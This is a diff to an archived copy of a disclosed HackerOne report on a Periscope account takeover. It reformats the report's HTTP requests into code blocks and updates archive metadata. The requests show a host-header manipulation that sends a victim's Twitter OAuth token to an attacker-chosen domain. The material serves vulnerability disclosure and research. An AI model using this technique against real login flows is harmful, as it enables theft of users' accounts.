@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2018.md:48"
 commit: ""
-content_sha256: 7ce58189f0945dddf594651e9cd6ac7c3bb0769fb48b327ad49fc71c1b04158f
+content_sha256: c6e84399073bde52622c05ed7baaa68bdd9e1fc02baa50ce258439180e185220
 depth: full
 depth_reason: default
 kind: article
@@ -31,10 +31,10 @@ original_url: "https://hackerone.com/reports/317476"
 published: ""
 publisher: HackerOne
 publisher_english: ""
-raw_sha256: 8e2c0d36c6f6d79303f472663a25f4660393641475151c977ed6b4017b30c80b
+raw_sha256: c5d124268d9085b7e25e49a676f48532dd4acf0fc4d292810f1039aec45861e8
 retrieved_from: "https://hackerone.com/reports/317476"
 retrieved_kind: browser
-retrieved_utc: "2026-08-09T02:39:30+00:00"
+retrieved_utc: "2026-09-14T09:14:51+00:00"
 slug: hackerone-x-xai-disclosed-hackerone-account-takeover-periscope-tv
 snapshot: ""
 title_english: ""
@@ -48,12 +48,12 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://hackerone.com/reports/317476>
-- Preserved from: https://hackerone.com/reports/317476 (browser) on 2026-08-09
+- Preserved from: https://hackerone.com/reports/317476 (browser) on 2026-09-14
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
-archive of a source from the Web Hacking Techniques Index collections, kept so the
-page going offline. To read the original, follow the link above.
+archive of a source from the Web Hacking Techniques Index collections, kept so
+it remains readable if the page goes offline. To read the original, follow the link above.
 
 ## Content
 
@@ -97,7 +97,16 @@ Visit [https://www.periscope.tv/](https://www.periscope.tv/) and click login wit
 
 **Code**•292 Bytes
 
-1GET /i/twitter/login?csrf=████ HTTP/1.1 2Host: www.periscope.tv 3User-Agent: █████████ 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 5Accept-Language: en-US,en;q=0.5 6Accept-Encoding: gzip, deflate 7Referer: https://www.periscope.tv/ 8cookie: ...
+```
+GET /i/twitter/login?csrf=████ HTTP/1.1
+Host: www.periscope.tv
+User-Agent: █████████
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.periscope.tv/
+cookie: ...
+```
 
 Change the host header to
 
@@ -107,13 +116,24 @@ Full request
 
 **Code**•312 Bytes
 
-1GET /i/twitter/login?csrf=██████ HTTP/1.1 2Host: hackerone.com/www.periscope.tv 3User-Agent: █████████ 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 5Accept-Language: en-US,en;q=0.5 6Accept-Encoding: gzip, deflate 7Referer: https://www.periscope.tv/ 8cookie: ...
+```
+GET /i/twitter/login?csrf=██████ HTTP/1.1
+Host: hackerone.com/www.periscope.tv
+User-Agent: █████████
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.periscope.tv/
+cookie: ...
+```
 
 Response should be something like
 
 **Code**•156 Bytes
 
-1<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://twitter.com/oauth/authenticate?oauth_token=████████"></head></html>
+```
+<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://twitter.com/oauth/authenticate?oauth_token=████████"></head></html>
+```
 
 Send this link to victim, after authorizing, victim's twitter oauth token and verifier is sent to hackerone.com, attacker could now reuse the same token to takeover victim's account.
 
@@ -284,3 +304,7 @@ September 6, 2018, 3:37pm UTC
 This report has been disclosed.
 
 September 6, 2018, 3:37pm UTC
+
+## Recovery notes
+
+Source evidence recovered on 2026-09-14. The earlier source capture (SHA-256 `8e2c0d36c6f6d79303f472663a25f4660393641475151c977ed6b4017b30c80b`) is no longer available. This publication uses a separately preserved capture of the same document recorded on 2026-09-14 (SHA-256 `c5d124268d9085b7e25e49a676f48532dd4acf0fc4d292810f1039aec45861e8`). The complete exposed report and discussion were checked against this capture. Code examples now retain their source line breaks and characters in fenced blocks, and missing section headings were restored where present. The existing technique summary remains applicable. The missing earlier capture remains documented in the archive history.
